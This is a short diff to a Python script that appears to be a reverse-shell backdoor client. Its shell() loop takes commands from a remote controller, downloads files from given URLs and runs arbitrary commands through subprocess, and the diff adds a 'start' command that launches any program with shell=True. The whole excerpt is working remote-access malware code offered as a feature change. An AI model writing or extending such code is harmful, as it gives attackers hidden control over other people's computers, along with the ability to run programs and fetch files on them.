@@ -80,6 +80,12 @@ def shell():
 				reliable_send("[+] Download File From Specified URL")
 			except:
 				reliable_send("[!!] Failed to Download the file")
+		elif command[:5] == "start":
+			try:
+				subprocess.Popen(command[6:], shell=True)
+				reliable_send("[+] Started")
+			except:
+				reliable_send("[!!] Failed To Start")
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
